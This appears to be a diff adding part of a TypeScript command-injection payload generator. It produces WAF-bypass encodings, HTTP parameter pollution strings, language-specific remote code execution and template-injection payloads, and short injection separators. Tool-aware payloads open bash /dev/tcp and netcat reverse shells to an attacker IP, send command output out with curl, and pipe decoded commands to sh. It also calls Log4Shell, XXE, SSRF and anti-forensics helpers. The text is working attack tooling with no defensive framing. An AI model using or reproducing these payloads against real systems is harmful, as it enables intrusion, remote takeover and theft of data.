+  const html = htmlEnc(payload);
+  const rev  = payload.split("").reverse().join("");
+  const revB = b64(rev);
+
+  return [
+    u1,
+    u2,
+    urlEnc(b64(payload)),
+    urlEnc(urlEnc(payload)),
+    htmlEnc(urlEnc(payload)),
+    urlEnc(htmlEnc(payload)),
+    b64(urlEnc(payload)),
+    b64url(urlEnc(payload)),
+    `${u2.replace(/%25/g, "%2525")}`,
+    `${payload.replace(/[a-zA-Z]/g, c => `%${c.charCodeAt(0).toString(16).padStart(2,"0")}`)}`,
+    `${payload.replace(/[a-zA-Z]/g, c => `%u00${c.charCodeAt(0).toString(16).padStart(2,"0")}`)}`,
+    `${payload.replace(/./g, c => `&#${c.charCodeAt(0)};`)}`,
+    `${payload.replace(/./g, c => `&#x${c.charCodeAt(0).toString(16)};`)}`,
+    `${b64(b64(payload))}`,
+    `${b64(b64(b64(payload)))}`,
+    urlEnc(b64(b64(payload))),
+    `${rh.replace(/(..)(?!$)/g, "$1%")}`,
+    rev,
+    urlEnc(rev),
+    `${b64(rev)}`,
+    urlEnc(revB),
+  ].filter(s => s !== payload);
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   HTTP PARAMETER POLLUTION — duplicate params to confuse WAF vs app parsing
+   WAF reads first value; app reads last (or aggregated). Inject in the gap.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildParameterPollution(param: string, payload: string): string[] {
+  const safe = "1";
+  const enc  = encodeURIComponent(payload);
+  return [
+    `${param}=${safe}&${param}=${enc}`,
+    `${param}=${enc}&${param}=${safe}`,
+    `${param}[]=${safe}&${param}[]=${enc}`,
+    `${param}[0]=${safe}&${param}[1]=${enc}`,
+    `${param}=${safe};${param}=${enc}`,
+    `${param}=${safe}%26${param}=${enc}`,
+    `${param}=${safe}%0a${param}=${enc}`,
+    `${param}[safe]=${safe}&${param}[inject]=${enc}`,
+    `${param}%00=${safe}&${param}=${enc}`,
+    `${param}=${safe},%20${enc}`,
+  ];
+}
+
+export function buildContextPayloads(
+  cmd:         string,
+  os:          "windows" | "linux" | "unknown",
+  waf:         string | null,
+  language:    string,
+  attackerIp  = "127.0.0.1",
+  attackerPort = "4444",
+): string[] {
+  const set: string[] = [];
+  const lang = language.toLowerCase();
+
+  if (!waf) {
+    if (os === "windows") {
+      set.push(`& ${cmd}`, `| ${cmd}`, `\r\n${cmd}`, `%0a${cmd}`, `%0d%0a${cmd}`);
+    } else {
+      set.push(cmd, `;${cmd}`, `$(${cmd})`, `&&${cmd}`, `|${cmd}`, `\`${cmd}\``, `{ ${cmd}; }`, `\n${cmd}\n`);
+    }
+  }
+
+  if (waf) {
+    const wafVariants = buildWafBypass(cmd).split("\n").filter(Boolean).slice(0, 25);
+    set.push(...wafVariants);
+    const specificHdrs = buildWafSpecificHeaders(waf);
+    if (specificHdrs.length) {
+      const wafDirect = applyQuantumBypass(cmd, "ifs");
+      set.push(wafDirect);
+    }
+  }
+
+  if (os === "windows") {
+    set.push(...buildWindowsPayloads(cmd));
+    set.push(...buildWindowsTimingPayloads(7));
+    set.push(...buildWindowsReverseShells(attackerIp, attackerPort).slice(0, 5));
+  } else {
+    set.push(...buildTimingPayloads(7).slice(0, 10));
+    set.push(...buildStealthPayloads(cmd).slice(0, 12));
+    if (os === "linux") {
+      set.push(...buildReverseShells(attackerIp, attackerPort).slice(0, 6));
+      set.push(...buildAntiForensicsPayloads(cmd).slice(0, 4));
+    }
+  }
+
+  if (lang.includes("java")) {
+    set.push(...buildSSTIPayloads(cmd).slice(0, 5));
+    set.push(...buildLog4ShellPayloads(attackerIp, attackerPort).slice(0, 6));
+    set.push(...buildSpelPayloads(cmd).slice(0, 5));
+    set.push(...buildGroovyPayloads(cmd).slice(0, 5));
+    set.push(...buildFreemarkerPayloads(cmd).slice(0, 4));
+  }
+
+  if (lang.includes("php")) {
+    const q = cmd.replace(/'/g, "\\'");
+    set.push(
+      `; system('${q}');`,
+      `; passthru('${q}');`,
+      `; shell_exec('${q}');`,
+      `; exec('${q}', $o); echo implode("\\n",$o);`,
+      `; echo popen('${q}','r');`,
+      `; proc_close(proc_open('${q}',array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$p));`,
+      ...buildPhpWrapperPayloads(cmd).slice(0, 6),
+    );
+  }
+
+  if (lang.includes("python")) {
+    const q = cmd.replace(/'/g, "\\'");
+    set.push(
+      `; __import__('os').system('${q}')`,
+      `; __import__('subprocess').check_output(['sh','-c','${q}'],stderr=-2).decode()`,
+      `; __import__('os').popen('${q}').read()`,
+      `{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('${q}').read()}}`,
+    );
+    set.push(...buildSSTIPayloads(cmd).slice(0, 4));
+  }
+
+  if (lang.includes("ruby")) {
+    const q = cmd.replace(/'/g, "\\'");
+    set.push(
+      `; \`${cmd}\``,
+      `; system('${q}')`,
+      `; exec('${q}')`,
+      `; IO.popen('${q}').read`,
+      `<%= \`${cmd}\` %>`,
+      `<%= system('${q}') %>`,
+    );
+  }
+
+  if (lang.includes(".net") || lang.includes("asp")) {
+    set.push(
+      `; System.Diagnostics.Process.Start("cmd", "/c ${cmd.replace(/"/g, '\\"')}");`,
+      `<%= new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c ${cmd.replace(/"/g, '\\"')}"){ UseShellExecute=false,RedirectStandardOutput=true}}.Start() %>`,
+    );
+  }
+
+  if (lang.includes("node") || lang.includes("express")) {
+    const q = cmd.replace(/"/g, '\\"');
+    set.push(
+      `; require('child_process').execSync('${cmd.replace(/'/g, "\\'")}').toString()`,
+      `; require("child_process").execSync("${q}",{stdio:"pipe"}).toString()`,
+      `{{constructor.constructor('return require("child_process").execSync("${q}").toString()')()}}`,
+    );
+  }
+
+  set.push(...buildSsrfPayloads(cmd).slice(0, 6));
+  set.push(...buildXXEPayloads(attackerIp, attackerPort).slice(0, 4));
+
+  return [...new Set(set)].filter(Boolean);
+}
+
+
+  /* ═══════════════════════════════════════════════════════════════════════
+     LENGTH-OPTIMIZED PAYLOADS  (for targets with strict input limits)
+     ═══════════════════════════════════════════════════════════════════════ */
+
+  /** Returns payloads sorted ascending by byte length. Pass maxLen to filter. */
+  export function buildLengthOptimizedPayloads(cmd: string, maxLen?: number): string[] {
+    const c = cmd.trim();
+    const all: string[] = [
+      // ≤ 8 chars (requires server to already know the command)
+      ";id",
+      "|id",
+      "`id`",
+      ";ls",
+      "|ls",
+      // ≤ 15 chars
+      ";id;",
+      "||id",
+      "&&id",
+      ";id #",
+      "|id #",
+      // Short heredoc
+      "<<'EOF'\nEOF",
+      // IFS trick (cmd must be 1 word)
+      ...(c.indexOf(" ") === -1 ? ["${IFS}" + c] : []),
+      // Brace group — very short eval
+      "{" + c + "}",
+      // Backtick no-spaces
+      ...(c.indexOf(" ") === -1 ? ["`" + c + "`"] : []),
+      // Dollar-paren no-spaces
+      ...(c.indexOf(" ") === -1 ? ["$(" + c + ")"] : []),
+      // ; separator
+      ";" + c,
+      // pipe
+      "|" + c,
+      // or-gate
+      "||" + c,
+      // and-gate
+      "&&" + c,
+      // newline
+      "\n" + c,
+      // null-byte separator
+      "\x00" + c,
+      // comment bypass
+      "#\n" + c,
+      // CR bypass
+      "\r\n" + c,
+      // semicolon + space variations
+      "; " + c,
+      " ; " + c,
+      "| " + c,
+      " | " + c,
+      "&& " + c,
+      // env-var IFS substitution
+      c.replace(/ /g, "${IFS}"),
+      // Tab substitution
+      c.replace(/ /g, "\t"),
+      // $@ between chars (bash)
+      c.split("").join("$@"),
+      // printf eval (compact)
+      "$(printf '" + c.replace(/'/g, "'\''") + "')",
+    ];
+
+    const sorted = [...new Set(all)].sort((a, b) => a.length - b.length);
+    return maxLen !== undefined ? sorted.filter(p => p.length <= maxLen) : sorted;
+  }
+
+  /* ═══════════════════════════════════════════════════════════════════════
+     ADAPTIVE PAYLOADS  (tool-aware — only emit payloads for present tools)
+     ═══════════════════════════════════════════════════════════════════════ */
+
+  /** Build payloads adapted to the available tools detected on the target.
+   *  Pass the list from targetProbe.ts probeAvailableTools().
+   */
+  export function buildAdaptivePayloads(
+    cmd:            string,
+    availableTools: string[],
+    attackerIp    = "127.0.0.1",
+    attackerPort  = 4444,
+  ): string[] {
+    const has = (tool: string) => availableTools.includes(tool);
+    const set: string[] = [];
+    const q = cmd.replace(/'/g, "'\''");
+
+    // Always include basic injection separators
+    set.push(";" + cmd, "||" + cmd, "&&" + cmd, "|" + cmd);
+
+    if (has("bash")) {
+      set.push(
+        "; bash -c '" + q + "'",
+        "; bash<<<'" + q + "'",
+        "; bash -i >& /dev/tcp/" + attackerIp + "/" + attackerPort + " 0>&1",
+      );
+    }
+    if (has("sh")) {
+      set.push("; sh -c '" + q + "'");
+    }
+    if (has("python3") || has("python")) {
+      const py = has("python3") ? "python3" : "python";
+      set.push(
+        "; " + py + " -c \"import os;os.system('" + q + "')\"",
+        "; " + py + " -c \"import subprocess;subprocess.call(['" + cmd.split(" ")[0] + "'])\"",
+      );
+    }
+    if (has("perl")) {
+      set.push("; perl -e 'system(\"" + q + "\")'");
+    }
+    if (has("ruby")) {
+      set.push("; ruby -e 'exec(\"" + q + "\")'");
+    }
+    if (has("php")) {
+      set.push("; php -r 'system(\"" + q + "\");'");
+    }
+    if (has("curl") || has("wget")) {
+      const dl = has("curl") ? "curl" : "wget -O-";
+      set.push(
+        "; " + dl + " http://" + attackerIp + ":" + attackerPort + "/?" + encodeURIComponent(cmd),
+      );
+    }
+    if (has("nc") || has("ncat") || has("netcat")) {
+      const nc = has("nc") ? "nc" : has("ncat") ? "ncat" : "netcat";
+      set.push("; " + nc + " " + attackerIp + " " + attackerPort + " -e /bin/sh");
+    }
+    if (has("base64")) {
+      const b64cmd = Buffer.from(cmd).toString("base64");
+      set.push("; echo " + b64cmd + "|base64 -d|sh");
+    }
+    if (has("xxd")) {
+      const hexcmd = Buffer.from(cmd).toString("hex");
+      set.push("; echo '" + hexcmd + "'|xxd -r -p|sh");
+    }
+    if (has("awk")) {
+      set.push("; awk 'BEGIN{cmd=\"" + q + "\";system(cmd)}'");
+    }
+
+    return [...new Set(set)].filter(Boolean);
+  }
+  
